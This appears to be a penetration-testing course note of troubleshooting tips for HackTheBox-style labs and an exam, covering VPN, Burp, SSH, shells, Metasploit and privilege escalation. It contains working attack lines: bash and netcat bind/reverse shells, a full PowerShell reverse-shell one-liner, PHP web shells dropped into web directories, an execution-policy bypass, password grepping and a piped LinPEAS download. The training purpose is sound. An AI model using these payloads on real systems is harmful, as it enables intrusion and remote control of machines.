---
id: gs-107
module: Getting Started
kind: note
title: "Common Pitfalls & Troubleshooting"
description: "VPN issues, Burp proxy misconfiguration, SSH key problems, shell stability issues, exam-time mistakes."
tags: [troubleshooting, vpn-issues, burp-proxy, ssh-keys, shell-stability, exam-mistakes]
---

# Common Pitfalls & Troubleshooting

## VPN Connection Issues

### Symptom: "Connection refused" when connecting to VPN

**Diagnosis:**
```bash
sudo openvpn user.ovpn
# Error: TLS handshake timeout or connection refused
```

**Solutions:**
1. Download fresh `.ovpn` file from HackTheBox (old ones expire)
2. Check OpenVPN version: `openvpn --version` (should be 2.4+)
3. Try different VPN region (EU, US, Australia, Singapore)
4. Check firewall: `sudo ufw status` (disable if blocking)
5. Kill old OpenVPN process: `sudo killall openvpn`

### Symptom: Connected but can't reach lab machines (10.129.0.0/16)

**Diagnosis:**
```bash
ping 10.10.14.1  # gateway — should work
ping 10.129.1.1  # lab machine — fails
```

**Solutions:**
1. Check `netstat -rn` — should show route: `10.129.0.0/16 via 10.10.14.1 tun0`
2. Manually add route: `sudo ip route add 10.129.0.0/16 via 10.10.14.1 dev tun0`
3. Verify tun0 has IP: `ip a | grep tun0` → should see `inet 10.10.14.X`
4. Restart OpenVPN: `sudo killall openvpn; sudo openvpn user.ovpn`

### Symptom: High latency / lag on VPN

**Solution:** Connect to nearest region.
- Go to HackTheBox → Lab Access → OpenVPN
- Select region closest to you (EU faster for Europe, etc.)
- VIP subscription = faster, less-crowded servers

### Symptom: Two-device limit (connected on PC, want to connect on VM)

**Issue:** HTB enforces 1 concurrent VPN connection per account.

**Solution:** Disconnect from one device first.
- Disconnect VPN on original machine: `sudo killall openvpn`
- Now connect on second device

---

## Burp Suite Proxy Issues

### Symptom: Browser stuck; nothing loads after using Burp

**Diagnosis:**
- Open Firefox → Menu → Settings → Network
- Check "Connection Settings" for proxy config

**Solution:**
1. **Turn off Burp proxy:**
   - Close Burp Suite, or
   - Click FoxyProxy extension icon → "Off"

2. **Verify browser proxy is disabled:**
   - Firefox: Preferences → Network → (no proxy)
   - Browser should load pages normally now

### Symptom: Burp intercepts everything; requests hang

**Diagnosis:**
- Burp is in "Intercept" mode; every request waits for you to click "Forward"

**Solution:**
1. Click "Intercept" button in Burp to toggle OFF
2. Or: use Proxy → Options → "Intercept Client Requests" → toggle to OFF
3. Now requests pass through automatically (still logged for review)

---

## SSH Key Issues

### Symptom: "Permission denied (publickey)" when trying to SSH

**Diagnosis:**
```bash
ssh -i mykey root@target
Permission denied (publickey).
```

**Solutions:**

1. **Key permissions too permissive:**
   ```bash
   chmod 600 mykey
   ssh -i mykey root@target
   ```
   SSH refuses keys with permissions > 600 (world-readable = risky).

2. **Key is for wrong user:**
   ```bash
   ssh -l root -i mykey target  # explicitly specify username
   # or if key is for 'ubuntu' user but you want root:
   ssh ubuntu@target -i mykey
   sudo su -  # escalate once logged in
   ```

3. **Key format wrong:**
   ```bash
   # If old format (OpenSSL), convert:
   ssh-keygen -p -N "" -m pem -f mykey  # convert to PEM
   ```

4. **Wrong IP or port:**
   ```bash
   # Try explicit port:
   ssh -i mykey -p 22 root@10.129.1.1
   ```

---

## Shell Stability & TTY Issues

### Symptom: Reverse shell connection drops after 30 seconds

**Diagnosis:**
- Network firewall killing idle connections
- Timeout configured on server

**Solutions:**
1. **Switch to bind shell** (more stable):
   ```bash
   # On target: mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
   # On attacker: nc target 1234
   ```

2. **Keep connection alive** (reverse shell):
   ```bash
   # Add keepalive in bash reverse shell:
   while true; do bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'; sleep 5; done
   ```

### Symptom: Can't use arrow keys, tab-complete, history in shell

**Diagnosis:**
- Shell is not in raw TTY mode (dumb terminal)

**Solution:**
```bash
# 1. Upgrade to PTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background shell (Ctrl+Z):
# [1]+ Stopped...

# 3. Fix terminal:
stty raw -echo
fg
# (press Enter twice if blank line)

# 4. Export TERM:
export TERM=xterm

# 5. Resize (optional, match your terminal):
stty rows 50 columns 200
```

Now shell is fully interactive.

---

## Nmap / Enumeration Issues

### Symptom: Nmap says "1000 ports scanned" but you expected full scan

**Diagnosis:**
- Forgot `-p-` flag (which means "all ports")

**Solution:**
```bash
nmap -sV -sC -p- $TARGET  # -p- = scan all 65535 ports
```

### Symptom: Gobuster finding too many results / noise

**Solution:**
```bash
# Only show HTTP 200s:
gobuster dir -u http://target/ -w wordlist.txt -s 200

# Or filter out certain status codes:
gobuster dir -u http://target/ -w wordlist.txt -b 404,403
```

---

## Metasploit Issues

### Symptom: Exploit runs but no shell received on listener

**Diagnosis:**
- LHOST set incorrectly (not routable to target)

**Solution:**
```bash
# In Metasploit:
set LHOST tun0  # use interface name, not IP
# or
set LHOST 10.10.14.2  # use your tun0 IP from: ip a

# Verify:
show options | grep LHOST
```

### Symptom: "Payload encoder failed"

**Diagnosis:**
- Encoding issue, or bad payload combination

**Solution:**
```bash
# Disable encoding:
set ENCODER none
exploit

# or try different payload:
set PAYLOAD windows/shell_reverse_tcp
exploit
```

---

## File Permission Issues

### Symptom: "Permission denied" when trying to write shell to /var/www/html

**Diagnosis:**
- Current user (www-data) doesn't own /var/www/html

**Solution:**
```bash
# Check owner:
ls -la /var/www/html/
# Output: drwxr-xr-x root root

# If you have RCE as www-data, write to temp dir first:
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/shell.php

# Then move/symlink if possible:
sudo mv /tmp/shell.php /var/www/html/shell.php

# Or find writable subdir:
find /var/www -type d -writable
# If /var/www/html/uploads is writable:
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/uploads/shell.php
```

---

## Cron Job Exploitation Fails

### Symptom: Appended script to cron job, but it never executes

**Diagnosis:**
1. Wrong path to script
2. File lost execute permissions
3. User doesn't have shell in /etc/passwd

**Solutions:**
```bash
# 1. Verify cron job:
cat /etc/crontab | grep root
# Output: */5 * * * * root /path/to/script.sh

# 2. Verify script is executable:
ls -la /path/to/script.sh
# Should have: -rwxr-xr-x (x = executable)

# 3. If you appended with echo, re-check perms:
chmod +x /path/to/script.sh

# 4. Test script manually as the cron user:
sudo -u root /path/to/script.sh

# 5. Check system logs:
tail -f /var/log/syslog | grep CRON  # watch for cron execution
```

---

## Windows-Specific Issues

### Symptom: PowerShell reverse shell doesn't work

**Diagnosis:**
- PowerShell execution policy blocks script
- Command length too long (PS limit ~8KB)

**Solutions:**
1. **Bypass execution policy:**
   ```powershell
   powershell -ExecutionPolicy Bypass -c "reverse_shell_command"
   ```

2. **Use short payload:**
   ```powershell
   powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('10.10.14.2',4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s2=$sb+'PS > ';$sbt=([Text.Encoding]::ASCII).GetBytes($s2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};"
   ```

---

## Exam Time Management Mistakes

| Mistake | Cost | Prevention |
|---------|------|-----------|
| Kernel exploit before trying sudo | 10 min + crash risk | Check `sudo -l` first, always |
| Running LinPEAS without reading output | 5 min wasted | Focus on RED lines only |
| Not upgrading TTY (fragile shell) | 20+ min (crashes) | Always do Python pty trick after initial shell |
| Hardcoding wrong attacker IP in shell | 10 min (redeploy) | Verify IP from `ip a` before executing |
| Forgetting to start listener | 5 min (redeploy) | Start `nc -lvnp 4444` BEFORE executing RCE |
| Wrong wordlist for gobuster (too big) | 30 min (slow scan) | Use common.txt (5K), not big.txt (220K) first run |
| Trying default creds once, giving up | 5 min retry | Try 3-5 combos: admin/admin, admin/password, guest/guest |

---

## When in Doubt on Exam

1. **Check `sudo -l`** — This single command solves 30% of privesc challenges
2. **Upgrade TTY immediately** — Fragile shells cost far more time than 30 seconds to upgrade
3. **Re-enumerate after each phase** — New findings trigger new attack paths
4. **Document as you go** — Flag format, usernames, creds found; reuse across challenges
5. **If stuck > 10 min:** Step back, re-read nmap output, check if you missed a port

---

## Quick Checklist (Copy-Paste for Exam)

```bash
# 1. Scan
nmap -sV -sC -p- $IP | tee scan.txt &

# 2. Web enum (if port 80 open)
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 -q

# 3. Get initial shell
# (method varies; execute RCE payload)

# 4. Upgrade TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# 5. Privesc checks
sudo -l
find / -perm -u=s 2>/dev/null | head -20
crontab -l
cat /etc/crontab
grep -r "password" /var/www /home 2>/dev/null
uname -a

# 6. If nothing works: run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Save this; use during exam as quick ref.
